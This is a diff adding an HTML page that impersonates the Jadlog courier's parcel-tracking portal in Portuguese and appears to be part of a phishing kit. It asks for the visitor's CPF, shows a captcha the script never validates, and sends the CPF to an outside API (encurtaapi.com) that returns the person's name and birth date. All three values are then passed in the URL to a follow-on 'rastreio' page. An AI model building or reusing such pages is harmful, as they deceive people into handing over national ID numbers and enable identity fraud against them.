@@ -1,0 +1,301 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="../jadlog/css/style.css">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        #buttonClick {
+            background-color: #CB0033;
+            color: white;
+            font-family: "Poppins";
+            padding: 7px 15px 7px 15px !important;
+            text-decoration: none !important;
+            border-radius: 10px !important;
+            border: none !important;
+            font-size: 18px !important;
+            font-weight: 600;
+        }
+
+        #buttonClick:hover {
+            background-color: #7a001e;
+            cursor: pointer;
+        }
+        .img1{
+            width: 45%;
+            height: 100%;
+        }
+
+        /* Estilos específicos para o formulário de consulta */
+        .consulta-form {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: 20px auto;
+            text-align: center;
+        }
+
+        .consulta-form h2 {
+            color: #CB0033;
+            font-family: "Poppins";
+            font-weight: 700;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .consulta-form p {
+            color: #5A594D;
+            font-family: "Poppins";
+            font-size: 16px;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            color: #333;
+            font-family: "Poppins";
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-family: "Poppins";
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #CB0033;
+        }
+
+        .btn-consultar {
+            background-color: #CB0033;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-family: "Poppins";
+            font-weight: 700;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 100%;
+        }
+
+        .btn-consultar:hover {
+            background-color: #7a001e;
+        }
+
+        .captcha-container {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            margin-bottom: 20px;
+            gap: 20px;
+        }
+
+        .captcha-image {
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        
+        .loading-bar {
+            width: 80%;
+            max-width: 300px;
+            height: 20px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .loading-progress {
+            width: 0%;
+            height: 100%;
+            background: #CB0033;
+            border-radius: 10px;
+            transition: width 0.3s ease;
+        }
+    </style>
+
+    <title>Rastreamento - Portal Jadlog</title>
+</head>
+
+<body>
+    <header>
+        <img class="img1" src="../jadlog/images/jadlog-logo.png" alt="">
+
+        <p style="margin-top: 5px; font-size: 12px;">Portal Jadlog > Consulta</p>
+    </header>
+
+    <div class="cta">
+        <img id="imagem" src="../jadlog/images/certo-jadlog.png" alt="" style="width: 80px; height: 80px;">
+
+        <h2>Rastreamento</h2>
+        <p>Deseja acompanhar seu objeto?</p>
+    </div>
+
+    <div class="consulta-form">
+        <h2>🔍 Rastreamento</h2>
+        <p>Digite seu CPF para rastreamento.</p>
+        
+        <form id="formulariocpf" onsubmit="event.preventDefault(); redirecionarCPF();">
+            <div class="form-group">
+                <label for="formcpf">CPF:</label>
+                <input type="text" id="formcpf" required placeholder="000.000.000-00" oninput="formatarCPF(this)">
+            </div>
+            
+            <div class="captcha-container">
+                <img decoding="async" src="images/4VQ3ugALLXKc.jpg" alt="Captcha" class="captcha-image" style="width: 150px; height: auto;">
+                
+                <div class="form-group" style="flex: 1;">
+                    <label for="captcha-text">Digite o texto contido na imagem:</label>
+                    <input type="text" id="captcha-text" placeholder="Digite o código">
+                </div>
+            </div>
+            
+            <button type="submit" class="btn-consultar">CONSULTAR</button>
+        </form>
+    </div>
+
+    <!-- Tela de carregamento -->
+    <div id="loadingScreen" class="loading-screen">
+        <img src="../jadlog/images/jadlog-logo.png" alt="Logo" style="max-width: 200px; margin-bottom: 20px;">
+        <h2>Consultando...</h2>
+        <div class="loading-bar">
+            <div id="loadingProgress" class="loading-progress"></div>
+        </div>
+        <p>Por favor, aguarde enquanto processamos sua consulta.</p>
+    </div>
+
+    <footer>
+        <img src="../jadlog/images/jadlog-logo.png" alt="">
+
+        <p>Todo conteúdo deste site está publicado sob a licença</p>
+    </footer>
+
+    <script>
+        // Função para formatar o CPF dinamicamente
+        function formatarCPF(input) {
+            let valor = input.value.replace(/\D/g, '');
+            valor = valor.substring(0, 11);
+            valor = valor.replace(/(\d{3})(\d)/, '$1.$2');
+            valor = valor.replace(/(\d{3})(\d)/, '$1.$2');
+            valor = valor.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            input.value = valor;
+        }
+
+        // Função para mostrar tela de carregamento
+        function mostrarLoading() {
+            const loadingScreen = document.getElementById('loadingScreen');
+            const loadingProgress = document.getElementById('loadingProgress');
+            
+            loadingScreen.style.display = 'flex';
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 2;
+                loadingProgress.style.width = progress + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                }
+            }, 50);
+        }
+
+        // Função original para validar o CPF e redirecionar
+        async function redirecionarCPF() {
+            const cpfInput = document.getElementById('formcpf');
+            const cpf = cpfInput.value.replace(/\D/g, '');
+
+            if (cpf.length !== 11) {
+                alert('Por favor, insira um CPF válido com 11 dígitos.');
+                return;
+            }
+
+            mostrarLoading();
+
+            const apiUrl = `https://encurtaapi.com/api/typebot?cpf=${cpf}`;
+            const fallbackUrl = `../rastreio`;
+
+            let timeout = false;
+
+            const timer = setTimeout(() => {
+                timeout = true;
+                console.warn('Tempo limite atingido. Redirecionando para a URL alternativa.');
+                window.location.href = fallbackUrl;
+            }, 3000);
+
+            try {
+                const response = await fetch(apiUrl);
+
+                if (timeout) return;
+                clearTimeout(timer);
+
+                if (!response.ok) throw new Error(`Erro na requisição: ${response.status}`);
+
+                const data = await response.json();
+
+                // Verificar se a API retornou "Nenhum resultado encontrado"
+                if (data.message && data.message.includes('Nenhum resultado encontrado')) {
+                    console.log('CPF não encontrado na API');
+                    // Redirecionar sem dados quando CPF não é encontrado
+                    window.location.href = fallbackUrl;
+                } else {
+                    let nome = data.NOME || 'Nome não disponível';
+                    let nasc = data.NASCIMENTO || 'Data de nascimento não disponível';
+
+                    // Garantir que a data esteja no formato dd/mm/yyyy
+                    if (nasc && /^\d{4}-\d{2}-\d{2}$/.test(nasc)) {
+                        nasc = new Date(nasc).toLocaleDateString('pt-BR');
+                    }
+
+                    window.location.href = `../rastreio/?nome=${encodeURIComponent(nome)}&cpf=${cpf}&nascimento=${encodeURIComponent(nasc)}`;
+                }
+            } catch (error) {
+                console.error('Erro ao acessar a API, redirecionando para link alternativo:', error);
+                if (!timeout) {
+                    window.location.href = fallbackUrl;
+                }
+            }
+        }
+    </script>
+
+</body></html>
